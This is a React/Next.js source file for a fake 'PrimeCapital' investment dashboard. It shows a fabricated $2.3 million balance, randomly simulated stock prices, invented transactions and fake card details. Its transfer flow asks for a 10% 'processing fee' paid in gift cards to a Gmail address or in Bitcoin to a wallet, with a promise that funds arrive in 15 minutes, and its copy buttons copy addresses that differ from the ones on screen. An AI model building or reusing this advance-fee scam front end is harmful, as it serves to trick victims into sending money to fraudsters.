'use client';
import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Footer from '@/components/Footer';

export default function DashboardPage() {
  const router = useRouter();
  const [userName, setUserName] = useState('Najee');
  const [totalBalance] = useState('$2,300,000.00');
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [showAllTransactions, setShowAllTransactions] = useState(false);
  const [showCardDetails, setShowCardDetails] = useState(false);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
  const [transferForm, setTransferForm] = useState({
    bank: '',
    accountNumber: '',
    accountName: '',
    amount: ''
  });
  const [showCopyConfirmation, setShowCopyConfirmation] = useState(false);
  const [copyConfirmationText, setCopyConfirmationText] = useState('');

  const banks = [
    'JPMorgan Chase',
    'Bank of America',
    'Wells Fargo',
    'Citibank',
    'U.S. Bank',
    'Truist Bank',
    'PNC Bank',
    'TD Bank',
    'Capital One',
    'Charles Schwab Bank',
    'Goldman Sachs Bank',
    'Morgan Stanley Bank',
    'American Express Bank',
    'Discover Bank',
    'Ally Bank',
    'USAA Bank',
    'Navy Federal Credit Union',
    'State Farm Bank',
    'Fifth Third Bank',
    'Regions Bank'
  ];

  const [stocks, setStocks] = useState([
    { symbol: 'AAPL', price: 185.64, change: 2.34, changePercent: 1.28 },
    { symbol: 'MSFT', price: 420.72, change: -1.23, changePercent: -0.29 },
    { symbol: 'GOOGL', price: 152.45, change: 3.12, changePercent: 2.09 },
    { symbol: 'AMZN', price: 180.75, change: 1.45, changePercent: 0.81 },
    { symbol: 'META', price: 485.96, change: -2.15, changePercent: -0.44 },
  ]);

  const [transactions] = useState([
    { type: 'Deposit', amount: 50000, date: 'Jan 15, 2024', status: 'Completed', source: 'Coinbase' },
    { type: 'Investment', amount: -200000, date: 'Jan 10, 2024', status: 'Completed', source: 'Tesla' },
    { type: 'Wired Check', amount: 75000, date: 'Jan 8, 2024', status: 'Completed', source: 'Google' },
    { type: 'Deposit', amount: 120000, date: 'Jan 5, 2024', status: 'Completed', source: 'Microsoft' },
    { type: 'Investment', amount: -150000, date: 'Jan 3, 2024', status: 'Completed', source: 'Amazon' },
    { type: 'Wired Check', amount: 90000, date: 'Dec 28, 2023', status: 'Completed', source: 'Facebook' },
    { type: 'Deposit', amount: 60000, date: 'Dec 25, 2023', status: 'Completed', source: 'Coinbase' },
    { type: 'Investment', amount: -180000, date: 'Dec 20, 2023', status: 'Completed', source: 'Tesla' },
    { type: 'Wired Check', amount: 110000, date: 'Dec 15, 2023', status: 'Completed', source: 'Google' },
  ]);

  useEffect(() => {
    // Check if user is logged in
    const isLoggedIn = localStorage.getItem('isLoggedIn');
    if (!isLoggedIn) {
      router.push('/login');
    }

    // Simulate live stock price changes
    const interval = setInterval(() => {
      setStocks(prevStocks => 
        prevStocks.map(stock => {
          const randomChange = (Math.random() - 0.5) * 2;
          const newPrice = stock.price + randomChange;
          const newChange = randomChange;
          const newChangePercent = (newChange / stock.price) * 100;
          return {
            ...stock,
            price: Number(newPrice.toFixed(2)),
            change: Number(newChange.toFixed(2)),
            changePercent: Number(newChangePercent.toFixed(2))
          };
        })
      );
    }, 3000);

    return () => clearInterval(interval);
  }, [router]);

  const handleLogout = () => {
    localStorage.removeItem('isLoggedIn');
    localStorage.removeItem('userEmail');
    router.push('/login');
  };

  const handleTransfer = () => {
    setShowTransferModal(true);
  };

  const handleTransferSubmit = (e) => {
    e.preventDefault();
    setShowTransferModal(false);
    setShowPaymentModal(true);
  };

  const handlePaymentMethodSelect = (method) => {
    setSelectedPaymentMethod(method);
  };

  const calculateFee = () => {
    const amount = parseFloat(transferForm.amount.replace(/[^0-9.-]+/g, ''));
    return (amount * 0.1).toFixed(2);
  };

  const copyToClipboard = (text, type) => {
    navigator.clipboard.writeText(text);
    setCopyConfirmationText(type === 'giftcard' ? 'Email copied!' : 'Wallet address copied!');
    setShowCopyConfirmation(true);
    setTimeout(() => {
      setShowCopyConfirmation(false);
    }, 2000);
  };

  const formatCardNumber = (number) => {
    return number.replace(/(\d{4})/g, '$1 ').trim();
  };

  return (
    <main className="relative min-h-screen">
      {/* Copy Confirmation Toast */}
      {showCopyConfirmation && (
        <div className="fixed bottom-4 right-4 bg-yellow-500 text-black px-4 py-2 rounded-lg shadow-lg z-50 animate-fade-in-out">
          {copyConfirmationText}
        </div>
      )}
      <div 
        className="absolute inset-0 bg-cover bg-center bg-no-repeat bg-fixed"
        style={{ 
          backgroundImage: 'url(/bg.jpg)',
          imageRendering: 'crisp-edges',
          WebkitImageRendering: 'crisp-edges'
        }}
      >
        <div className="absolute inset-0 bg-black/50"></div>
      </div>
      <div className="fixed top-0 left-0 right-0 z-50 p-4 md:px-24 md:py-10 flex justify-between items-center bg-white/10 backdrop-blur-sm shadow-md">
        <div 
          onClick={() => router.push('/')} 
          className="text-white text-2xl cursor-pointer"
        >
          Prime<span className="text-yellow-500">Capital</span>
        </div>
        
        {/* Mobile Hamburger Menu */}
        <button 
          className="md:hidden text-white cursor-pointer"
          onClick={() => setIsMenuOpen(!isMenuOpen)}
        >
          <svg 
            className="w-6 h-6" 
            fill="none" 
            stroke="currentColor" 
            viewBox="0 0 24 24"
          >
            {isMenuOpen ? (
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth={2} 
                d="M6 18L18 6M6 6l12 12" 
              />
            ) : (
              <path 
                strokeLinecap="round" 
                strokeLinejoin="round" 
                strokeWidth={2} 
                d="M4 6h16M4 12h16M4 18h16" 
              />
            )}
          </svg>
        </button>

        {/* Mobile Menu */}
        <div 
          className={`fixed top-0 right-0 h-full w-64 bg-white/10 backdrop-blur-sm md:hidden transform transition-transform duration-300 ease-in-out ${
            isMenuOpen ? 'translate-x-0' : 'translate-x-full'
          }`}
          style={{ height: '100vh' }}
        >
          <div className="flex flex-col p-6 space-y-6 h-full">
            <div className="flex justify-end">
              <button 
                onClick={() => setIsMenuOpen(false)}
                className="text-white cursor-pointer"
              >
                <svg 
                  className="w-6 h-6" 
                  fill="none" 
                  stroke="currentColor" 
                  viewBox="0 0 24 24"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M6 18L18 6M6 6l12 12" 
                  />
                </svg>
              </button>
            </div>
            <button 
              onClick={() => {
                router.push('/');
                setIsMenuOpen(false);
              }}
              className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer text-lg"
            >
              Home
            </button>
            <button 
              onClick={() => {
                router.push('/profile');
                setIsMenuOpen(false);
              }}
              className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer text-lg"
            >
              Profile
            </button>
            <button 
              onClick={() => {
                handleLogout();
                setIsMenuOpen(false);
              }}
              className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer text-lg"
            >
              Logout
            </button>
          </div>
        </div>

        {/* Desktop Menu */}
        <div className="hidden md:flex items-center space-x-6">
          <button 
            onClick={() => router.push('/')}
            className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer"
          >
            Home
          </button>
          <button 
            onClick={() => router.push('/profile')}
            className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer"
          >
            Profile
          </button>
          <button 
            onClick={handleLogout}
            className="text-white hover:text-yellow-500 transition-colors duration-300 cursor-pointer"
          >
            Logout
          </button>
        </div>
      </div>

      {/* Transfer Money Modal */}
      {showTransferModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md w-full max-w-md">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-semibold text-yellow-500">Transfer Money</h2>
              <button 
                onClick={() => setShowTransferModal(false)}
                className="text-white hover:text-yellow-500"
              >
                <svg 
                  className="w-6 h-6" 
                  fill="none" 
                  stroke="currentColor" 
                  viewBox="0 0 24 24"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M6 18L18 6M6 6l12 12" 
                  />
                </svg>
              </button>
            </div>
            <form onSubmit={handleTransferSubmit} className="space-y-4">
              <div>
                <label className="block text-gray-200 mb-2">Select Bank</label>
                <select
                  value={transferForm.bank}
                  onChange={(e) => setTransferForm({ ...transferForm, bank: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  required
                >
                  <option value="">Select a bank</option>
                  {banks.map((bank) => (
                    <option key={bank} value={bank} className="bg-black text-white">
                      {bank}
                    </option>
                  ))}
                </select>
              </div>
              <div>
                <label className="block text-gray-200 mb-2">Account Number</label>
                <input
                  type="text"
                  value={transferForm.accountNumber}
                  onChange={(e) => setTransferForm({ ...transferForm, accountNumber: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  placeholder="Enter account number"
                  required
                />
              </div>
              <div>
                <label className="block text-gray-200 mb-2">Account Name</label>
                <input
                  type="text"
                  value={transferForm.accountName}
                  onChange={(e) => setTransferForm({ ...transferForm, accountName: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  placeholder="Enter account name"
                  required
                />
              </div>
              <div>
                <label className="block text-gray-200 mb-2">Amount</label>
                <input
                  type="text"
                  value={transferForm.amount}
                  onChange={(e) => setTransferForm({ ...transferForm, amount: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-yellow-500"
                  placeholder="Enter amount"
                  required
                />
              </div>
              <button
                type="submit"
                className="w-full bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
              >
                Transfer
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Payment Confirmation Modal */}
      {showPaymentModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md w-full max-w-md">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-semibold text-yellow-500">Complete Payment</h2>
              <button 
                onClick={() => {
                  setShowPaymentModal(false);
                  setSelectedPaymentMethod('');
                }}
                className="text-white hover:text-yellow-500"
              >
                <svg 
                  className="w-6 h-6" 
                  fill="none" 
                  stroke="currentColor" 
                  viewBox="0 0 24 24"
                >
                  <path 
                    strokeLinecap="round" 
                    strokeLinejoin="round" 
                    strokeWidth={2} 
                    d="M6 18L18 6M6 6l12 12" 
                  />
                </svg>
              </button>
            </div>
            <div className="space-y-4 text-sm">
              <div className="bg-white/5 p-4 rounded-lg">
                <p className="text-gray-200 mb-2">Receiver Details:</p>
                <div className="space-y-2">
                  <p className="text-gray-200">Bank: <span className="text-white">{transferForm.bank}</span></p>
                  <p className="text-gray-200">Account Name: <span className="text-white">{transferForm.accountName}</span></p>
                  <p className="text-gray-200">Account Number: <span className="text-white">{transferForm.accountNumber}</span></p>
                  <p className="text-gray-200">Transfer Amount: <span className="text-white">${transferForm.amount}</span></p>
                </div>
              </div>

              <div className="bg-white/5 p-4 rounded-lg">
                <p className="text-gray-200 mb-2">Payment Information:</p>
                <div className="space-y-2">
                  <p className="text-gray-200">Processing Fee (10%): <span className="text-white">${calculateFee()}</span></p>
                  <p className="text-sm text-gray-300">Note: The processing fee is 10% of your transfer amount. This fee is required to complete the transaction.</p>
                  <p className="text-sm text-yellow-500 mt-2">Your account will be credited within 15 minutes after the processing fee is paid.</p>
                </div>
              </div>
              
              <div className="space-y-4">
                <div 
                  className={`p-4 rounded-lg border ${
                    selectedPaymentMethod === 'giftcard' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
                  } transition-colors duration-300`}
                >
                  <button
                    onClick={() => handlePaymentMethodSelect('giftcard')}
                    className="w-full flex items-center justify-between"
                  >
                    <span className="text-white">Pay with Gift Card</span>
                    <span className="text-yellow-500">→</span>
                  </button>
                  {selectedPaymentMethod === 'giftcard' && (
                    <div className="mt-4">
                      <p className="text-gray-200 mb-2">Send gift card to:</p>
                      <div className="flex items-center space-x-2">
                        <code className="flex-1 bg-black/50 p-2 rounded text-white break-all">primecapitalorg@gmail.com</code>
                        <button
                          onClick={() => copyToClipboard('giftcards@primecapital.com', 'giftcard')}
                          className="bg-yellow-500 hover:bg-yellow-600 text-black px-3 py-2 rounded-lg font-semibold transition-colors duration-300"
                        >
                          Copy
                        </button>
                      </div>
                    </div>
                  )}
                </div>

                <div 
                  className={`p-4 rounded-lg border ${
                    selectedPaymentMethod === 'bitcoin' ? 'border-yellow-500 bg-yellow-500/10' : 'border-white/10'
                  } transition-colors duration-300`}
                >
                  <button
                    onClick={() => handlePaymentMethodSelect('bitcoin')}
                    className="w-full flex items-center justify-between"
                  >
                    <span className="text-white">Pay with Bitcoin</span>
                    <span className="text-yellow-500">→</span>
                  </button>
                  {selectedPaymentMethod === 'bitcoin' && (
                    <div className="mt-4">
                      <p className="text-gray-200 mb-2">Send Bitcoin to:</p>
                      <div className="flex flex-col space-y-2">
                        <code className="w-full bg-black/50 p-2 rounded text-white break-all">bc1qr5ja7mnssdn3p5dghdnjr23eng55gfcdcsl9fz</code>
                        <button
                          onClick={() => copyToClipboard('bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', 'bitcoin')}
                          className="w-full bg-yellow-500 hover:bg-yellow-600 text-black px-3 py-2 rounded-lg font-semibold transition-colors duration-300"
                        >
                          Copy
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="relative z-10 pt-32 px-4 pb-8">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-col items-center mb-8">
            <div className="flex items-center mb-4 md:mt-10">
              <h1 className="text-3xl font-bold text-white ">Welcome back,</h1>
              <p className="text-3xl font-bold text-white ml-2">{userName}.</p>
            </div>
            <div className="flex flex-col sm:flex-row gap-4">
              <button
                onClick={handleTransfer}
                className="w-full sm:w-[200px] bg-yellow-500 hover:bg-opacity-80 text-black px-4 py-3 rounded-lg font-semibold transition-colors duration-300 shadow-md text-lg"
              >
                Transfer Money
              </button>
            </div>
          </div>

          {/* Live Stock Content */}
          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md mb-8">
            <h2 className="text-xl font-semibold mb-4 text-yellow-500">Live Market</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 gap-4">
              {stocks.map((stock, index) => (
                <div key={index} className="p-4 bg-white/5 rounded-lg">
                  <div className="flex justify-between items-center">
                    <span className="font-semibold text-white">{stock.symbol}</span>
                    <span className={`text-sm ${stock.change >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                      {stock.change >= 0 ? '↑' : '↓'} {Math.abs(stock.changePercent)}%
                    </span>
                  </div>
                  <div className="mt-2">
                    <p className="text-lg font-semibold text-white">${stock.price}</p>
                    <p className={`text-sm ${stock.change >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                      {stock.change >= 0 ? '+' : ''}{stock.change}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Portfolio Overview</h2>
              <div className="space-y-4">
                <div className="flex justify-between items-center">
                  <span className="text-gray-200">Total Balance</span>
                  <span className="text-2xl font-bold text-green-500">{totalBalance}</span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="p-4 bg-white/5 rounded-lg">
                    <span className="text-gray-200">Real Estate</span>
                    <p className="text-lg font-semibold text-green-500">$1,200,000</p>
                  </div>
                  <div className="p-4 bg-white/5 rounded-lg">
                    <span className="text-gray-200">Cryptocurrency</span>
                    <p className="text-lg font-semibold text-green-500">$800,000</p>
                  </div>
                  <div className="p-4 bg-white/5 rounded-lg">
                    <span className="text-gray-200">Stocks</span>
                    <p className="text-lg font-semibold text-green-500">$300,000</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Digital Debit Card</h2>
              <div className="p-4 bg-white/5 rounded-lg">
                <div className="flex justify-between items-center mb-4">
                  <span className="text-gray-200">Card Number</span>
                  <span className="text-white">
                    {showCardDetails ? formatCardNumber('3347832944752225') : '**** **** **** 2225'}
                  </span>
                </div>
                <div className="flex justify-between items-center mb-4">
                  <span className="text-gray-200">Expiry Date</span>
                  <span className="text-white">12/25</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-200">CVV</span>
                  <span className="text-white">{showCardDetails ? '522' : '***'}</span>
                </div>
                <button 
                  onClick={() => setShowCardDetails(!showCardDetails)}
                  className="w-full mt-4 bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                >
                  {showCardDetails ? 'Hide Card Details' : 'View Card Details'}
                </button>
              </div>
            </div>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Earnings & Returns Tracker</h2>
              <div className="space-y-4">
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Total Earnings</span>
                  <p className="text-2xl font-bold text-green-500">$345,000</p>
                </div>
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Monthly Returns</span>
                  <p className="text-2xl font-bold text-green-500">+$28,750</p>
                </div>
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Weekly Returns</span>
                  <p className="text-2xl font-bold text-green-500">+$7,200</p>
                </div>
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Daily Returns</span>
                  <p className="text-2xl font-bold text-green-500">+$1,500</p>
                </div>
              </div>
            </div>
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Transaction History</h2>
              <div className="space-y-4">
                {(showAllTransactions ? transactions : transactions.slice(0, 5)).map((transaction, index) => (
                  <div key={index} className="p-4 bg-white/5 rounded-lg">
                    <div className="flex justify-between items-center">
                      <div>
                        <span className="font-semibold text-white">{transaction.type}</span>
                        <p className="text-sm text-gray-300">{transaction.source}</p>
                      </div>
                      <span className={`text-lg font-semibold ${transaction.amount >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                        {transaction.amount >= 0 ? '+' : ''}{transaction.amount.toLocaleString()}
                      </span>
                    </div>
                    <div className="flex justify-between items-center mt-2">
                      <span className="text-sm text-gray-200">{transaction.date}</span>
                      <span className="text-sm text-green-500">{transaction.status}</span>
                    </div>
                  </div>
                ))}
                <button
                  onClick={() => setShowAllTransactions(!showAllTransactions)}
                  className="w-full mt-4 bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                >
                  {showAllTransactions ? 'View Less Transactions' : 'View More Transactions'}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </main>
  );
} 